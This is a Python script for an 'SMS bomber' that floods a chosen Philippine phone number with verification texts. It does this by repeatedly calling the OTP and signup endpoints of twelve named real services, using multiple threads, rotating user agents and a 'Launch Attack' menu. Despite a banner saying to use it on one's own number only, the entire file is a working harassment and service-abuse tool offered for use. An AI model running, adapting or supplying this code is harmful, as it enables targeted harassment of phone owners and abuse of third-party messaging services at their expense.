import requests
import threading
import time
import os
import sys
import random
from concurrent.futures import ThreadPoolExecutor, as_completed

WEED = r"""
              @@@@@       @@@@@
           @@@@@@@@@     @@@@@@@@@
         @@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
       @@@@@@@@@@  @@@@@@@@@  @@@@@@@@@@
      @@@@@@@@@      @@@@@      @@@@@@@@@
      @@@@@@@@   @   @@@@@   @   @@@@@@@@
       @@@@@@@  @@@  @@@@@  @@@  @@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
         @@   @@@@@@@@@@@@@@@@@@@   @@
               @@@@@@@@@@@@@@@@
                   @@@@@@@@@
                    @@@@@@@
                   @@@@@@@@@
                  @@@@@@@@@@@
                 @@@@@@@@@@@@@
                  @@@@@@@@@@@
                   @@@@@@@@@
                    @@@@@@@
                      @@@
"""

BANNER = """
\033[32m
  ____  __  __ ____    ____   ___  __  __ ____  _____ ____  
 / ___||  \/  / ___|  | __ ) / _ \|  \/  | __ )| ____|  _ \ 
 \___ \| |\/| \___ \  |  _ \| | | | |\/| |  _ \|  _| | |_) |
  ___) | |  | |___) | | |_) | |_| | |  | | |_) | |___|  _ < 
 |____/|_|  |_|____/  |____/ \___/|_|  |_|____/|_____|_| \_\\
\033[0m
\033[36m              [ SMS BOMBER — MULTI-SERVICE ]
              [ USE ON YOUR OWN NUMBER ONLY    ]\033[0m
"""

R  = "\033[31m"
G  = "\033[32m"
Y  = "\033[33m"
B  = "\033[34m"
M  = "\033[35m"
C  = "\033[36m"
W  = "\033[37m"
BR = "\033[1;31m"
BG = "\033[1;32m"
BY = "\033[1;33m"
BC = "\033[1;36m"
RS = "\033[0m"

sent   = 0
failed = 0
lock   = threading.Lock()
stop_event = threading.Event()  # FIX: thread-safe stop flag

SUCCESS_CODES = {200, 201, 202}

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)",
]

def _req(method, url, **kwargs):
    try:
        kwargs.setdefault("timeout", 12)
        kwargs.setdefault("headers", {
            "User-Agent": random.choice(UA_LIST)
        })
        r = getattr(requests, method)(url, **kwargs)
        return r, r.status_code
    except Exception:
        return None, 0


def _ok(r, status):
    if r is None:
        return False
    if status in SUCCESS_CODES:
        return True
    try:
        body = str(r.json()).lower()
        if any(k in body for k in ["success", "sent", "otp", "verify", "true"]):
            return True
    except Exception:
        pass
    return False


def _normalize_ph(ph):
    """Normalize phone to +63XXXXXXXXXX format."""
    ph = ph.strip().replace(" ", "").replace("-", "")
    if ph.startswith("0"):
        ph = "+63" + ph[1:]
    elif ph.startswith("63") and not ph.startswith("+"):
        ph = "+" + ph
    elif not ph.startswith("+"):
        ph = "+63" + ph
    return ph


def _strip_country(ph):
    """Return 9XXXXXXXXX (no country code, no +)."""
    ph = _normalize_ph(ph)
    return ph.lstrip("+63")


SERVICE_NAMES = [
    "mWell",
    "Pexx",
    "OSIM",
    "EzLoanCash",
    "Xpress PH",
    "Bistro/Arlo",
    "Bayad Online",
    "LBC Connect",
    "Pickup Coffee",
    "HoneyLoan",
    "Kumu",
    "S5",
]

# FIX: removed services that require paid API keys (Nexmo, Twilio, MSG91, Sinch, Telesign)
# they'll just 401 every time, waste of threads — stripped out
# add them back yourself if you got creds

SERVICES = [

    # 0 — mWell
    lambda ph: _req("post",
        "https://gw.mwell.com.ph/api/v2/app/mwell/auth/sign/mobile-number",
        json={"mobileNumber": _normalize_ph(ph)},
        headers={"Content-Type": "application/json",
                 "User-Agent": random.choice(UA_LIST)}
    ),

    # 1 — Pexx
    lambda ph: _req("post",
        "https://api.pexx.com/api/trpc/auth.sendSignupOtp?batch=1",
        json={"0": {"json": {"phone": _normalize_ph(ph)}}},
        headers={"Content-Type": "application/json",
                 "User-Agent": random.choice(UA_LIST)}
    ),

    # 2 — OSIM
    lambda ph: _req("post",
        "https://prod.services.osim-cloud.com/identity/api/v1.0/account/register",
        json={"phoneNumber": _normalize_ph(ph)},
        headers={"Content-Type": "application/json",
                 "User-Agent": random.choice(UA_LIST)}
    ),

    # 3 — EzLoanCash
    lambda ph: _req("post",
        "https://gateway.ezloancash.ph/security/auth/otp/request",
        json={"mobileNumber": _normalize_ph(ph)},
        headers={"Content-Type": "application/json",
                 "User-Agent": random.choice(UA_LIST)}
    ),

    # 4 — Xpress PH
    lambda ph: _req("post",
        "https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",
        json={"mobileNumber": _normalize_ph(ph)},
        headers={"Content-Type": "application/json",
                 "User-Agent": random.choice(UA_LIST)}
    ),

    # 5 — Bistro/Arlo (FIX: cleaner number strip)
    lambda ph: _req("get",
        f"https://bistrobff-adminservice.arlo.com.ph:9001/api/v1/customer/loyalty/otp"
        f"?mobileNumber=63{_strip_country(ph)}",
        headers={"Content-Type": "application/json",
                 "User-Agent": random.choice(UA_LIST)}
    ),

    # 6 — Bayad Online
    lambda ph: _req("post",
        "https://api.online.bayad.com/api/sign-up/otp",
        json={"mobile": _normalize_ph(ph)},
        headers={"Content-Type": "application/json",
                 "User-Agent": random.choice(UA_LIST)}
    ),

    # 7 — LBC Connect
    lambda ph: _req("post",
        "https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree"
        "/processInitRegistrationVerification",
        json={"mobileNumber": _normalize_ph(ph)},
        headers={"Content-Type": "application/json",
                 "User-Agent": random.choice(UA_LIST)}
    ),

    # 8 — Pickup Coffee
    lambda ph: _req("post",
        "https://production.api.pickup-coffee.net/v2/customers/login",
        json={"phone_number": _normalize_ph(ph)},
        headers={"Content-Type": "application/json",
                 "User-Agent": random.choice(UA_LIST)}
    ),

    # 9 — HoneyLoan
    lambda ph: _req("post",
        "https://api.honeyloan.ph/api/client/registration/step-one",
        json={"mobile_number": _normalize_ph(ph)},
        headers={"Content-Type": "application/json",
                 "User-Agent": random.choice(UA_LIST)}
    ),

    # 10 — Kumu
    lambda ph: _req("post",
        "https://api.kumuapi.com/v2/user/sendverifysms",
        json={"phone_number": _normalize_ph(ph)},
        headers={"Content-Type": "application/json",
                 "User-Agent": random.choice(UA_LIST)}
    ),

    # 11 — S5
    lambda ph: _req("post",
        "https://api.s5.com/player/api/v1/otp/request",
        json={"phone": _normalize_ph(ph)},
        headers={"Content-Type": "application/json",
                 "User-Agent": random.choice(UA_LIST)}
    ),
]

TOTAL_SERVICES = len(SERVICES)


def bomb_once(phone, idx):
    global sent, failed
    svc_idx = idx % TOTAL_SERVICES
    svc     = SERVICES[svc_idx]
    name    = SERVICE_NAMES[svc_idx]
    try:
        r, status = svc(phone)
        success   = _ok(r, status)

        body_snip = ""
        if r is not None:
            try:
                body_snip = str(r.json())[:80]
            except Exception:
                body_snip = r.text[:80]

        with lock:
            if success:
                sent += 1
                print(f"  {BG}[✓]{RS} {C}{name:<18}{RS} {G}[{status}] SENT{RS}  "
                      f"| {BG}{sent}{RS}s {R}{failed}{RS}f | {W}{body_snip}{RS}")
            else:
                failed += 1
                print(f"  {R}[✗]{RS} {Y}{name:<18}{RS} {R}[{status}] FAIL{RS}  "
                      f"| {BG}{sent}{RS}s {R}{failed}{RS}f | {W}{body_snip}{RS}")
    except Exception as e:
        with lock:
            failed += 1
            print(f"  {R}[!]{RS} {Y}{SERVICE_NAMES[svc_idx]:<18}{RS} {R}EXCEPTION: {e}{RS}")


def run_batch(phone, batch_size, threads, delay):
    indices = list(range(batch_size))
    random.shuffle(indices)

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(bomb_once, phone, i): i for i in indices}
        for f in as_completed(futures):
            if stop_event.is_set():
                # FIX: cancel remaining futures on stop
                for remaining in futures:
                    remaining.cancel()
                break
            try:
                f.result()
            except Exception as e:
                # FIX: don't silently swallow — at least print it
                with lock:
                    print(f"  {R}[!] future error: {e}{RS}")

    if delay > 0 and not stop_event.is_set():
        time.sleep(delay)


def start_attack(phone, count, threads, delay, batch_size):
    global sent, failed
    sent = failed = 0
    stop_event.clear()  # FIX: reset event, not a bool flag

    total_batches = (count + batch_size - 1) // batch_size
    total_fired   = 0

    print(f"\n{BC}{'═'*70}{RS}")
    print(f"{BC}  TARGET  : {W}{phone}{RS}")
    print(f"{BC}  COUNT   : {W}{count}{RS}")
    print(f"{BC}  THREADS : {W}{threads}{RS}")
    print(f"{BC}  DELAY   : {W}{delay}s{RS}")
    print(f"{BC}  BATCH   : {W}{batch_size}{RS}")
    print(f"{BC}  SERVICES: {W}{TOTAL_SERVICES}{RS}")
    print(f"{BC}{'═'*70}{RS}\n")

    try:
        for batch_num in range(total_batches):
            if stop_event.is_set():
                break
            remaining  = count - total_fired
            this_batch = min(batch_size, remaining)
            print(f"\n{BY}  ── BATCH {batch_num+1}/{total_batches} ({this_batch} requests) ──{RS}")
            run_batch(phone, this_batch, threads, delay)
            total_fired += this_batch

    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n{Y}[!] interrupted{RS}")

    rate = round((sent / total_fired * 100), 1) if total_fired else 0
    print(f"\n{BC}{'═'*70}{RS}")
    print(f"{BG}  DONE   → {sent} sent  |  {R}{failed} failed  {BG}({rate}% hit rate){RS}")
    print(f"{BC}  TOTAL  → {total_fired}/{count} fired across {total_batches} batches{RS}")
    print(f"{BC}{'═'*70}{RS}\n")


def debug_menu():
    cls()
    print(f"\n{BC}  ── DEBUG MODE — test each service one by one ──{RS}\n")
    phone = input(f"  {C}Your number: {RS}").strip()
    phone = _normalize_ph(phone)  # FIX: normalize before debug
    print(f"\n  {Y}normalized to: {phone}{RS}")
    print(f"\n  {Y}firing all {TOTAL_SERVICES} services once...{RS}\n")
    for i, svc in enumerate(SERVICES):
        name = SERVICE_NAMES[i]
        try:
            r, status = svc(phone)
            ok   = _ok(r, status)
            body = ""
            if r is not None:
                try:
                    body = str(r.json())[:100]
                except Exception:
                    body = r.text[:100]
            tag = f"{BG}[✓] SENT{RS}" if ok else f"{R}[✗] FAIL{RS}"
            print(f"  [{i:>2}] {C}{name:<18}{RS} {tag} {Y}[{status}]{RS} {W}{body}{RS}")
        except Exception as e:
            print(f"  [{i:>2}] {C}{name:<18}{RS} {R}[!] ERROR: {e}{RS}")
        time.sleep(0.3)
    input(f"\n  {C}press enter...{RS}")


def cls():
    os.system("cls" if os.name == "nt" else "clear")


def print_weed():
    colors = [G, BG, Y, BY]
    lines  = WEED.strip("\n").split("\n")
    for i, line in enumerate(lines):
        print(f"{colors[i % len(colors)]}{line}{RS}")


def show_menu():
    cls()
    print_weed()
    print(BANNER)
    print(f"  {C}┌─────────────────────────┐{RS}")
    print(f"  {C}│       MAIN MENU         │{RS}")
    print(f"  {C}├─────────────────────────┤{RS}")
    print(f"  {C}│  {W}[1] Launch Attack       {C}│{RS}")
    print(f"  {C}│  {W}[2] Settings            {C}│{RS}")
    print(f"  {C}│  {W}[3] Service List        {C}│{RS}")
    print(f"  {C}│  {W}[4] Debug Services      {C}│{RS}")
    print(f"  {C}│  {W}[5] Exit                {C}│{RS}")
    print(f"  {C}└─────────────────────────┘{RS}")
    print()
    return input(f"  {BC}Select option: {RS}").strip()


def attack_menu():
    cls()
    print(f"\n{BC}  ── LAUNCH ATTACK ──{RS}\n")
    phone = input(f"  {C}Phone number (e.g. +639XXXXXXXXX): {RS}").strip()
    if not phone:
        print(f"  {R}[!] phone number required{RS}")
        time.sleep(1)
        return

    phone = _normalize_ph(phone)  # FIX: normalize on input
    print(f"  {G}[+] normalized: {phone}{RS}")

    try:
        count   = int(input(f"  {C}Total requests   [{Y}100{C}]: {RS}").strip() or 100)
        threads = int(input(f"  {C}Threads          [{Y}10{C}]:  {RS}").strip() or 10)
        delay   = float(input(f"  {C}Batch delay (s)  [{Y}0{C}]:   {RS}").strip() or 0)
        batch   = int(input(f"  {C}Batch size       [{Y}20{C}]:  {RS}").strip() or 20)
    except ValueError:
        print(f"  {R}[!] invalid input{RS}")
        time.sleep(1)
        return

    confirm = input(f"\n  {Y}[?] Attack {phone} with {count} requests? (y/n): {RS}").strip().lower()
    if confirm != "y":
        return

    start_attack(phone, count, threads, delay, batch)
    input(f"\n  {C}press enter to return...{RS}")


def settings_menu():
    cls()
    print(f"\n{BC}  ── SETTINGS ──{RS}\n")
    print(f"  {C}Total services loaded: {BG}{TOTAL_SERVICES}{RS}")
    print(f"  {C}Recommended threads  : {W}5–20{RS}")
    print(f"  {C}Recommended batch    : {W}10–50{RS}")
    print(f"  {C}Recommended delay    : {W}0–2s{RS}")
    print(f"\n  {Y}Tip: higher threads = faster but more failures{RS}")
    print(f"  {Y}Tip: run Debug first to see which services actually work{RS}")
    input(f"\n  {C}press enter to return...{RS}")


def service_list_menu():
    cls()
    print(f"\n{BC}  ── SERVICE LIST ({TOTAL_SERVICES} total) ──{RS}\n")
    for i, n in enumerate(SERVICE_NAMES):
        color = C if i % 2 == 0 else W
        print(f"  {color}[{i:>3}] {n}{RS}")
    input(f"\n  {C}press enter to return...{RS}")


def main():
    while True:
        choice = show_menu()
        if choice == "1":
            attack_menu()
        elif choice == "2":
            settings_menu()
        elif choice == "3":
            service_list_menu()
        elif choice == "4":
            debug_menu()
        elif choice == "5":
            cls()
            print(f"\n{C}  cya bro{RS}\n")
            sys.exit(0)


if __name__ == "__main__":
    main()